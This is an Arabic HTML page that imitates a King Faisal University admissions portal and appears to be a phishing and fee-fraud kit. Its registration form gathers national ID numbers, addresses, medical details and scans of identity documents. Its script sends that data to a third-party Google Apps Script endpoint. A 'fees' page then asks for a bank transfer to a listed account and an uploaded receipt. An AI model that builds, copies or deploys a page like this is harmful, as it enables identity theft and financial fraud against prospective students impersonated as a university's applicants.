<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>بوابة الخدمات الأكاديمية - جامعة الملك فيصل</title>
<link rel="icon" type="image/png" href="kfu_logo.png">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

<style>
/* ألوان رسمية */
:root {
  --gold: #d4af37;
  --dark: #333;
  --white: #fff;
  --green: #0b6b44;
}
body {
  margin:0;
  font-family: "Cairo","Segoe UI",Tahoma,sans-serif;
  background:#fff;
  color:var(--dark);
}
.login-container {
  max-width:450px;
  margin:60px auto;
  padding:20px;
  background:var(--gold);
  border-radius:12px;
  box-shadow:0 8px 20px rgba(0,0,0,0.2);
  text-align:center;
}
.login-container img {
  width:80px;
  margin-bottom:10px;
}
.login-container h1 {
  margin:0;
  font-size:24px;
  color:#fff;
  font-weight:800;
}
.login-container p {
  margin:4px 0 20px 0;
  color:#fff;
  font-weight:500;
}
.login-form input {
  width:100%;
  padding:12px;
  margin:8px 0;
  border-radius:8px;
  border:1px solid #ccc;
  font-size:14px;
}
.login-btn {
  width:100%;
  padding:12px;
  background:var(--green);
  color:#fff;
  border:none;
  border-radius:8px;
  font-weight:700;
  cursor:pointer;
}
.quick-access {
  margin-top:20px;
}
.quick-access .quick-link {
  display:inline-block;
  text-decoration:none;
  background:#fff;
  color:var(--green);
  padding:10px 14px;
  border-radius:8px;
  font-weight:700;
}
.container {
  max-width:800px;
  margin:40px auto;
  padding:24px;
  background:#fff;
  border-radius:12px;
  box-shadow:0 8px 20px rgba(0,0,0,0.1);
  display:none;
}
.grid2 {
  display:grid;
  grid-template-columns:1fr 1fr;
  gap:20px;
}
.grid2 label { font-weight:700; margin-top:10px; display:block; }
.grid2 input, .grid2 select, .grid2 textarea {
  width:100%; padding:10px; margin-top:4px; border-radius:6px; border:1px solid #ccc;
}
textarea { min-height:80px; resize:vertical; }
.section-title { margin-top:20px; font-weight:800; font-size:16px; border-bottom:1px dashed #ccc; padding-bottom:6px; }
.submit-area { text-align:center; margin-top:20px; }
.submit-area .btn { padding:12px 36px; border:none; border-radius:8px; font-weight:700; cursor:pointer; margin:0 6px; }
.submit-area .btn.send { background:var(--green); color:#fff; }
.submit-area .btn.cancel { background:#ccc; color:#000; }
#paymentPage { display:none; max-width:600px; margin:40px auto; padding:20px; background:#fff; border-radius:12px; box-shadow:0 8px 20px rgba(0,0,0,0.1); }
#paymentPage h2 { color:var(--green); text-align:center; }
#paymentPage label { font-weight:700; display:block; margin-top:12px; }
#paymentPage input { width:100%; padding:10px; margin-top:4px; border-radius:6px; border:1px solid #ccc; }
#paymentPage .btn { margin-top:16px; padding:12px 28px; border:none; border-radius:8px; background:var(--gold); color:#000; font-weight:700; cursor:pointer; width:100%; }
.toast { position:fixed; top:20px; right:20px; background:var(--green); color:#fff; padding:12px 18px; border-radius:8px; opacity:0; transition:all .4s; z-index:999; }
.toast.show { opacity:1; }
@media(max-width:900px){.grid2{grid-template-columns:1fr;}}
</style>
</head>

<body>

<!-- الصفحة الرئيسية -->
<div class="login-container">
  <img src="kfu_logo.png" alt="شعار جامعة الملك فيصل">
  <h1>جامعة الملك فيصل</h1>
  <p>بوابة الخدمات الأكاديمية</p>

  <div class="login-form">
    <input type="text" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
    <input type="password" placeholder="كلمة المرور" required>
    <button class="login-btn">تسجيل الدخول</button>
  </div>

  <div class="quick-access">
    <a href="#" class="quick-link" onclick="showForm()"><i class="fas fa-user-graduate"></i> تقديم طلب جديد</a>
  </div>
</div>

<!-- نموذج التقديم -->
<div class="container" id="registrationForm">
<form id="registrationFormForm" action="https://script.google.com/macros/s/AKfycbxglQ_oGCF_ICL56X9dofD56F1mF89vIef6NrN7BObysCTEs5xQVfQ9wGc8N4aWwkG2/exec" method="POST" enctype="multipart/form-data">

<h2>نموذج تسجيل الطالب</h2>

<div class="grid2">
<div>
<label>الاسم الكامل *</label>
<input type="text" name="fullName" required>
<label>الجنس *</label>
<select name="gender" required><option value="">اختر...</option><option>ذكر</option><option>أنثى</option></select>
<label>الجنسية *</label>
<select name="nationality" required>
<option value="">اختر...</option>
<option>السعودية</option>
<option>اليمن</option>
<option>مصر</option>
<option>سوريا</option>
<option>الأردن</option>
<option>لبنان</option>
<option>العراق</option>
<option>فلسطين</option>
<option>السودان</option>
<option>تونس</option>
<option>المغرب</option>
<option>الإمارات</option>
<option>الكويت</option>
<option>البحرين</option>
<option>عمان</option>
<option>قطر</option>
<option>تركيا</option>
<option>أفغانستان</option>
<option>باكستان</option>
<option>الهند</option>
<option>إندونيسيا</option>
<option>Other</option>
</select>
<label>الدولة *</label>
<select name="country" required>
<option value="">اختر الدولة</option>
<option>المملكة العربية السعودية</option>
<option>اليمن</option>
<option>الإمارات</option>
<option>الكويت</option>
<option>البحرين</option>
<option>عمان</option>
<option>قطر</option>
<option>الأردن</option>
<option>سوريا</option>
<option>لبنان</option>
<option>السودان</option>
<option>المغرب</option>
<option>تونس</option>
<option>أخرى</option>
</select>
<label>رقم الهوية / الإقامة *</label>
<input type="text" name="idNumber" required>
<label>تاريخ الميلاد *</label>
<input type="date" name="birthDate" required>
<label>مكان الميلاد</label>
<input type="text" name="birthPlace">
<label>المدينة *</label>
<input type="text" name="city" required>
<label>العنوان *</label>
<textarea name="address" required></textarea>
<label>رقم الجوال *</label>
<input type="tel" name="phone" required>
<label>البريد الإلكتروني *</label>
<input type="email" name="email" required>
</div>

<div>
<label>نوع المؤهل السابق *</label>
<select name="prevDegree" required>
<option value="">اختر...</option>
<option>ثانوي</option>
<option>دبلوم</option>
<option>بكالوريوس</option>
<option>ماجستير</option>
</select>
<label>سنة التخرج *</label>
<input type="number" name="gradYear" min="1900" max="2100" required>
<label>اسم المدرسة / الجامعة السابقة</label>
<input type="text" name="prevInstitute">
<label>المعدل / النسبة</label>
<input type="text" name="gpa">
<label>التخصص المطلوب *</label>
<input type="text" name="desiredMajor" required>
<label>نوع الدراسة *</label>
<select name="studyType" required>
<option value="">اختر...</option>
<option>انتظام</option>
<option>انتساب</option>
<option>تعليم عن بعد</option>
</select>
<label>الكلية / القسم *</label>
<select name="faculty" required>
<option value="">اختر الكلية</option>
<option>كلية الطب</option>
<option>كلية الهندسة</option>
<option>كلية العلوم</option>
<option>كلية الآداب</option>
<option>كلية إدارة الأعمال</option>
<option>كلية الحاسبات وتقنية المعلومات</option>
<option>كلية التربية</option>
<option>كلية القانون</option>
<option>كلية الصحة العامة</option>
</select>
<label>الحالة الطبية</label>
<input type="text" name="medicalInfo" placeholder="إن وُجد">
<div class="section-title">جهة الاتصال للطوارئ</div>
<label>الاسم</label>
<input type="text" name="emergencyName">
<label>صلة القرابة</label>
<input type="text" name="emergencyRelation">
<label>رقم الجوال للطوارئ</label>
<input type="tel" name="emergencyPhone">
</div>
</div>

<div class="section-title">المرفقات المطلوبة</div>
<label>صورة الهوية / الإقامة *</label>
<input type="file" name="fileId" required>
<label>صورة الشهادة / المؤهل *</label>
<input type="file" name="fileCertificate" required>
<label>صورة شخصية *</label>
<input type="file" name="filePhoto" required>

<div style="margin-top:12px">
<label><input type="checkbox" name="agree" required> أقر بأن جميع البيانات صحيحة ومطابقة للوثائق.</label>
</div>

<div class="submit-area">
<button type="submit" class="btn send">إرسال الطلب</button>
<button type="reset" class="btn cancel">إلغاء</button>
</div>
</form>
</div>

<!-- صفحة الدفع بعد إرسال النموذج -->
<div id="paymentPage">
<h2>صفحة الرسوم</h2>
<label>رقم الحساب:</label>
<input type="text" value="SA3380000984608016472540" readonly>
<label>البنك:</label>
<input type="text" value="الراجحي" readonly>
<label>اسم المحول:</label>
<input type="text" name="payerName" required>
<label>تاريخ العملية:</label>
<input type="date" name="paymentDate" required>
<label>المبلغ المحول:</label>
<input type="number" name="amount" required>
<label>رفع إيصال الدفع:</label>
<input type="file" name="paymentReceipt" required>
<button id="submitPayment" class="btn">إرسال البيانات</button>
<p style="margin-top:12px; color:#444;">بعد إرسال البيانات سيتم التواصل معك عبر الواتساب أو البريد الإلكتروني لإرسال الرقم الجامعي.</p>
</div>

<div class="toast" id="toast"></div>

<script>
function showForm(){
  document.getElementById('registrationForm').style.display='block';
  window.scrollTo({top:0,behavior:'smooth'});
}

// إشعار
function showToast(msg){
  const toast=document.getElementById('toast');
  toast.textContent=msg;
  toast.classList.add('show');
  setTimeout(()=>toast.classList.remove('show'),2500);
}

// إرسال نموذج التسجيل
document.getElementById('registrationFormForm').addEventListener('submit',function(e){
  e.preventDefault();
  const form=this;
  const fd=new FormData(form);
  fetch(form.action,{method:'POST',body:fd})
  .then(res=>{
    if(res.ok){
      showToast('✅ تم إرسال البيانات بنجاح');
      form.style.display='none';
      document.getElementById('paymentPage').style.display='block';
    } else showToast('❌ حدث خطأ حاول لاحقاً');
  }).catch(()=>showToast('❌ فشل الاتصال'));
});

// إرسال بيانات الدفع
document.getElementById('submitPayment').addEventListener('click',function(){
  const paymentForm=new FormData();
  const fields=['payerName','paymentDate','amount','paymentReceipt'];
  let valid=true;
  fields.forEach(f=>{
    const el=document.querySelector(`[name=${f}]`);
    if(!el.value){ valid=false; el.focus(); return false; }
    paymentForm.append(f,el.files?el.files[0]:el.value);
  });
  if(!valid){ showToast('❌ يرجى تعبئة جميع البيانات'); return; }
  fetch('https://script.google.com/macros/s/AKfycbxglQ_oGCF_ICL56X9dofD56F1mF89vIef6NrN7BObysCTEs5xQVfQ9wGc8N4aWwkG2/exec',{method:'POST',body:paymentForm})
  .then(res=>{
    if(res.ok){ showToast('✅ تم إرسال بيانات الدفع'); document.getElementById('paymentPage').innerHTML='<h2>تم استلام جميع بياناتك بنجاح!</h2><p>سيتم التواصل معك قريباً لإرسال الرقم الجامعي.</p>'; }
    else showToast('❌ حدث خطأ حاول لاحقاً');
  }).catch(()=>showToast('❌ فشل الاتصال'));
});
</script>
</body>
  </html>
